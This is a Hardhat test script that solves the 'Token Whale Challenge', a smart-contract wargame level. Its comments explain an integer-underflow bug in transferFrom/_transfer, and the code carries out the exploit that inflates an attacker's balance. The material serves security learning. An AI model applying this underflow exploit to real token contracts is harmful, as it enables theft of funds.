const { expect } = require("chai");
const hre = require("hardhat");
const { ethers, JsonRpcProvider } = require('ethers');

describe("Token Whale Challenge exploit", function () {
  it("Attacker should be able to get more than 1_000_000 tokens", async function () {
    const [user1, user2] = await hre.ethers.getSigners();

    const TokenWhaleChallenge = await hre.ethers.getContractFactory("TokenWhaleChallenge");

    const tokenWhaleChallenge = await TokenWhaleChallenge.deploy(user1.address);
    await tokenWhaleChallenge.deployed();

    // exploit
    // - addres A has balance of 1000 tokens.
    // - address A approved address B to allowance of some number
    // - then address B calls `transferFrom(A, A, 671)` using amount less than 1000, which is maximum A can send.
    // - as `transferFrom` is calling internally `_transfer` which is then updating balance of `msg.sender` and sender in this case is `B` and address `B` does not have balance, underflow happens.
    // - which is resulting `B` has now huge aount of tokens and can send that tokens to anyone.
    await tokenWhaleChallenge.connect(user1).approve(user2.address, 500);
    await tokenWhaleChallenge.connect(user2).transferFrom(user1.address, user1.address, 10);

    await tokenWhaleChallenge.connect(user2).transfer(user1.address, 2000000);


    // assert
    expect(await tokenWhaleChallenge.isComplete()).to.be.true;
  });
});